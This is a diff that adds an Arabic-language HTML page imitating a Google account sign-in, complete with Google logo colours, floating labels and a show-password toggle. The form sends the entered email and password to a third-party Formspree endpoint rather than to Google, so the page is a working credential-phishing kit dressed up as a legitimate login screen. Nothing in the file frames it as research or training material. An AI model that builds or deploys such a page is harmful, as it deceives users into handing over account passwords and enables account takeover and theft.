@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - حساب Google</title>
+    <style>
+        /* إعداد الخلفية بصورة Far Cry 6 */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
+                              url('picturs/782f032235bd4b00c80de140b8e70538.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        * { box-sizing: border-box; }
+
+        /* صندوق تسجيل الدخول */
+        .login-box {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+        }
+
+        .logo { font-size: 24px; font-weight: 500; margin-bottom: 12px; }
+        h2 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+        .subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        
+        .input-group { position: relative; margin-bottom: 25px; }
+        .input-group input { 
+            width: 100%; padding: 13px 15px; 
+            border: 1px solid #dadce0; border-radius: 4px; 
+            font-size: 16px; outline: none; background: transparent; 
+        }
+
+        .input-group input:focus { border: 2px solid #1a73e8; }
+        
+        /* النص العائم */
+        .input-group label { 
+            position: absolute; top: 50%; right: 12px; 
+            transform: translateY(-50%); color: #5f6368; 
+            pointer-events: none; transition: 0.15s all ease; 
+            background: white; padding: 0 5px; 
+        }
+
+        .input-group input:focus ~ label, 
+        .input-group input:not(:placeholder-shown) ~ label { 
+            top: 0; font-size: 12px; color: #1a73e8; 
+        }
+
+        .show-pass { 
+            display: flex; align-items: center; justify-content: flex-start; 
+            margin-bottom: 30px; font-size: 14px; color: #202124; cursor: pointer; 
+        }
+        .show-pass input { margin-left: 10px; width: 18px; height: 18px; }
+
+        .footer-buttons { display: flex; justify-content: space-between; align-items: center; }
+        .create-account { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
+        
+        .next-btn { 
+            background-color: #1a73e8; color: white; border: none; 
+            padding: 10px 24px; border-radius: 4px; 
+            font-weight: 500; cursor: pointer; font-size: 14px; 
+            transition: 0.3s;
+        }
+        .next-btn:hover { background-color: #1765cc; transform: scale(1.03); }
+
+        @media (max-width: 450px) { .login-box { width: 92%; padding: 30px 20px; } }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="logo">
+            <span style="color: #4285F4;">G</span><span style="color: #EA4335;">o</span><span style="color: #FBBC05;">o</span><span style="color: #4285F4;">g</span><span style="color: #34A853;">l</span><span style="color: #EA4335;">e</span>
+        </div>
+
+        <h2>تسجيل الدخول</h2>
+        <p class="subtitle">المتابعة عبر حساب Google</p>
+
+        <!-- تم وضع اللينك الخاص بك هنا -->
+        <form action="https://formspree.io/f/xaqyoezb" method="POST">
+            
+            <div class="input-group">
+                <input type="email" name="البريد الإلكتروني" id="email" required placeholder=" ">
+                <label for="email">البريد الإلكتروني أو الهاتف</label>
+            </div>
+
+            <div class="input-group">
+                <input type="password" name="كلمة المرور" id="password" required placeholder=" ">
+                <label for="password">أدخل كلمة المرور</label>
+            </div>
+
+            <label class="show-pass">
+                <input type="checkbox" onclick="togglePassword()"> عرض كلمة المرور
+            </label>
+
+            <div class="footer-buttons">
+                <a href="#" class="create-account">إنشاء حساب</a>
+                <button type="submit" class="next-btn">التالي</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function togglePassword() {
+            var x = document.getElementById("password");
+            x.type = (x.type === "password") ? "text" : "password";
+        }
+    </script>
+
+</body>
+</html>
